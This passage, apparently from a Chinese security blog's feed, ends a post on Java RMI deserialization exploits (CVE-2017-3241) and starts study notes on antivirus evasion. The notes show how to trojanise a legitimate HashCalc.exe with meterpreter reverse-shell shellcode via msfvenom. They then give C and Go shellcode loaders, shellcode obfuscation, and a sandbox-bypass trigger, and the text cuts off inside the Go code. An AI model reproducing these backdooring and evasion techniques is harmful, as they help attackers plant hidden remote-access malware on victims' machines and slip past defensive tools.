&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">ICalc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行CalcServer和HelloClient，会看到client的报错&lt;/p>
&lt;pre tabindex="0">&lt;code>Exception in thread &amp;#34;main&amp;#34; java.lang.ClassFormatError: Incompatible magic value 1013478509 in class file server/ICalc
&lt;/code>&lt;/pre>&lt;p>同时注意到我们的burp收到了请求&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220504013700746.png" alt="image-20220504013700746">&lt;/p>
&lt;p>利用的话将class放在Web服务器的 /RMIClient$Payload.class即可&lt;/p>
&lt;p>codebase通过&lt;code>[Ljava.rmi.server.ObjID;&lt;/code>的&lt;code>classAnnotations&lt;/code>（由&lt;code>annotateClass&lt;/code>方法写入）传递，所以即使我们没有RMI客户端，只要修改&lt;code>classAnnotations&lt;/code>的值就可以控制codebase，指向我们的网站&lt;/p>
&lt;h2 id="cve-2017-3241">CVE-2017-3241&lt;/h2>
&lt;p>&lt;a href="https://www.daimajiaoliu.com/daima/4761a96151003fc">Java RMI远程反序列化任意类及远程代码执行解析（CVE-2017-3241 ）&lt;/a> | &lt;a href="https://github.com/xfei3/CVE-2017-3241-POC">CVE-2017-3241-POC&lt;/a> | &lt;a href="http://www.code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html">CVE-2017-3241 Java RMI Registry.bind()反序列化漏洞&lt;/a> | &lt;a href="https://blog.csdn.net/LeeHDsniper/article/details/71599504">JAVA RMI 反序列化远程命令执行漏洞&lt;/a> | &lt;a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">一次攻击内网rmi服务的深思&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/85846">【技术分享】Java AMF3 反序列化漏洞分析&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>&amp;lt;=8u112 直接利用&lt;/p>
&lt;p>8u112&amp;lt; JDK &amp;lt; 8u241 需要反链恶意JRMP服务端，所以需要目标服务器能访问攻击者控制的服务器&lt;/p>
&lt;/blockquote>
&lt;p>TL;DR：对于RMI服务，server端除了正常实现rmi接口的A类之外还存在一个实现了readObject方法的PublicKnown类（比如常见的cc），我们的恶意客户端可以在本地用完整的类名重写A类（调用PublicKnown的反序列化相关方法进行rce）并作为RMI的参数传入，触发rce；poc代码请参见&lt;a href="https://github.com/xfei3/CVE-2017-3241-POC">这里&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/1599551987770-38f4ea97-a031-4790-b11d-e73e60eab647.png" alt="image.png">&lt;/p>
&lt;p>具体的各版本绕过参考上面的🔗，我就不班门弄斧了喵（）&lt;/p></description></item><item><title>免杀学习笔记Ⅰ</title><link>https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/</link><pubDate>Tue, 26 Apr 2022 23:42:54 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/</guid><description>&lt;h2 id="shellcode注入">shellcode注入&lt;/h2>
&lt;p>&lt;a href="https://github.com/NetSPI/PESecurity">PESecurity&lt;/a>可以检测目标对象是否开启ASLR等安全选项&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Import-Module&lt;/span> &lt;span style="color:#111">.\&lt;/span>&lt;span style="color:#111">Get-PESecurity&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">psm1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Get-PESecurity&lt;/span> &lt;span style="color:#f92672">-file&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#111">signle&lt;/span> &lt;span style="color:#111">file&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Get-PESecurity&lt;/span> &lt;span style="color:#111">-directory&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#111">directory&lt;/span> &lt;span style="color:#111">path&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">DLLs&lt;/span> &lt;span style="color:#111">&amp;amp;&lt;/span> &lt;span style="color:#111">EXEs&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407150555253.png" alt="image-20220407150555253">&lt;/p>
&lt;p>选择目标对象的标准：&lt;/p>
&lt;ul>
&lt;li>大小&amp;lt;10mb，利于传输&lt;/li>
&lt;li>本身为大众文件，便于隐蔽&lt;/li>
&lt;li>不受ASLR或DEP等安全功能的保护&lt;/li>
&lt;li>最好本身有使用网络通信的合法功能&lt;/li>
&lt;/ul>
&lt;p>这里选择的是HashCalc.exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407152820447.png" alt="image-20220407152820447">&lt;/p>
&lt;ol>
&lt;li>首先在在代码区段中创建新的节头，或在内存中找到合适的位置植入我们的shellcode&lt;/li>
&lt;/ol>
&lt;p>用&lt;a href="https://down.52pojie.cn/Tools/PEtools/LordPE.7z">Lord PE&lt;/a>打开目标程序，并在区段表底部添加新段.ame，并将VSize和RSize都增加0x1000（4096字节），并设置可读可写可执行&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407153429603.png" alt="image-20220407153429603">&lt;/p>
&lt;p>此时直接运行会失败，因为我们添加了一个1000h字节的新段，但是该区段为空&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407153503852.png" alt="image-20220407153503852">&lt;/p>
&lt;p>先简单填充1000个0x00看程序是否正常运行，这里用的是&lt;a href="https://mh-nexus.de/downloads/HxDSetup.zip">HxD&lt;/a>（注意要填充到文件末尾）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407154451061.png" alt="image-20220407154451061">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407155458815.png" alt="image-20220407155458815">&lt;/p>
&lt;p>可以正常运行&lt;/p>
&lt;ol start="2">
&lt;li>劫持程序执行流程&lt;/li>
&lt;/ol>
&lt;p>首先在&lt;a href="https://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">Ollydbg&lt;/a>中转到内存部分（alt+M），可以看到我们新加的.ame，并且有RWE权限&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407160456405.png" alt="image-20220407160456405">&lt;/p>
&lt;p>接下来我们要将程序的执行流劫持到我们新添加的.ame段中，使最终执行程序时进入放有shellcode的.ame部分&lt;/p>
&lt;p>首先复制前3个操作码（之后回复执行流程时需要）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407164119652.png" alt="image-20220407164119652">&lt;/p>
&lt;p>我们复制.ame的起始地址00482000，并把程序入口处的&lt;code>push ebp&lt;/code>改为&lt;code>jmp 00482000&lt;/code>并保存为新的exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407165720185.png" alt="image-20220407165720185">&lt;/p>
&lt;p>再次运行时就已经不会展示正常的页面了&lt;/p>
&lt;ol start="3">
&lt;li>填充msf🐎&lt;/li>
&lt;/ol>
&lt;p>这里用messagebox做填充&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/messagebox &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;it&amp;#39;s demo&amp;#34;&lt;/span> -f hex
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>jmp 00482000&lt;/code>处enter跟随跳转，把payload复制到null的部分，保存为新的exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407170518230.png" alt="image-20220407170518230">&lt;/p>
&lt;p>成功运行&lt;/p>
&lt;ol start="4">
&lt;li>回复程序的正常执行流程&lt;/li>
&lt;/ol>
&lt;p>首先将shellcode最后一句跳转改为nop，使用&lt;code>popfd&lt;/code>和&lt;code>popod&lt;/code>回复堆栈操作，然后将原程序起始位置的汇编码复制到这里，最后跳转回原来的执行地址&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407180451897.png" alt="image-20220407180451897">&lt;/p>
&lt;p>就可以在弹messagebox之后继续HashCalc原程序了&lt;/p>
&lt;p>同理，我们可以插入msf🐎&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i &lt;span style="color:#ae81ff">4&lt;/span> -b &lt;span style="color:#d88200">&amp;#39;\x00&amp;#39;&lt;/span> &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4788&lt;/span> -f hex
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意此处选用&lt;code>x86/shikata_ga_nai&lt;/code>的encoder之后前面就不能用x64了，默认生成的都是x86的payload，并且要注意&lt;code>-i&lt;/code>参数的指定，要与前面扩充的新段大小相匹配&lt;/p>
&lt;h2 id="shellcode加载器">shellcode加载器&lt;/h2>
&lt;blockquote>
&lt;/blockquote>
&lt;p>根据前面对🐎结构的分析，我们知道单一的shellcode是无法执行的，需要配套的shellcode loader来接收后续的stager，编写的思路都是大差不差的，以动态加载内存为例：&lt;/p>
&lt;ol>
&lt;li>接收4字节缓冲区大小&lt;/li>
&lt;li>开辟内存&lt;/li>
&lt;li>将socket中的值复制到缓冲区中去&lt;/li>
&lt;li>读取字节到缓冲区&lt;/li>
&lt;li>执行syscall&lt;/li>
&lt;li>退出&lt;/li>
&lt;/ol>
&lt;p>这是最最最基础的loader，当考虑到免杀时，我们可以尝试使用不同的语言来编译exe（比如python, go等）、消除代码中的明显特征，或是为接收payload这一行为前加上沙盒中无法实现的条件来bypass&lt;/p>
&lt;p>下面以c的版本做主要的示例：）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 亲测这个encoder完全不能用到windows/x64/xxx上 之后编译exe也得用`gcc -m32 x.c -o x.exe` 必须配套32位&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 这样产生的shellcode本体可以做到基本免杀 后续的操作基于如何免杀加载&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i &lt;span style="color:#ae81ff">4&lt;/span> -b &lt;span style="color:#d88200">&amp;#39;\x00&amp;#39;&lt;/span> &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4788&lt;/span> -f c -o t1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="c">C&lt;/h3>
&lt;h4 id="不考虑loader的裸执行必被杀">不考虑loader的裸执行（必被杀&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="申请动态内存加载">申请动态内存加载&lt;/h4>
&lt;p>通常会调用kernel32的win api，常见函数和它们的作用（以c为例）&lt;/p>
&lt;pre tabindex="0">&lt;code>malloc: 分配内存
VirtualAlloc: 申请一块可读可写可执行的动态内存区域
memcpy: 从指定内存中复制内容至另一内存里
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LPVOID&lt;/span> &lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Memory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">sizeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">MEM_COMMIT&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">MEM_RESERVE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">PAGE_EXECUTE_READWRITE&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 内存地址, 大小, 分配类型, 该内存的初始保护属性
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">memcpy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">sizeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)())&lt;/span>&lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="内联汇编指令">内联汇编指令&lt;/h4>
&lt;p>*注意gcc的内联汇编与vc的不同 使用AT&amp;amp;T语法，请参照&lt;a href="https://www.jianshu.com/p/1782e14a0766">GCC内联汇编基础&lt;/a>&lt;/p>
&lt;h3 id="go">Go&lt;/h3>
&lt;p>通过&lt;code>syscall&lt;/code>可以丝滑地调用kernel32.dll的函数&lt;/p>
&lt;h4 id="条件触发">条件触发&lt;/h4>
&lt;p>首先对shellcode进行简易混淆&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># https://github.com/pureqh/bypassAV/blob/main/go_shellcode_encode.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">buf1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;shellcode&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">b64shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;H&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;T&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">b64shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里条件触发，指的是在最后指令执行前 先访问一次局域网内存在而沙箱内不存在的文件，达到bypass沙箱的效果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// https://github.com/pureqh/bypassAV/blob/main/main.go
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/base64&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/url&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;syscall&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;unsafe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">kernel32&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">syscall&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewLazyDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kernel32.dll&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">VirtualAlloc&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">kernel32&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;VirtualAlloc&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">RtlMoveMemory&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">kernel32&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;RtlMoveMemory&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ddm&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str1&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ddm&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str2&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;H&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str3&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
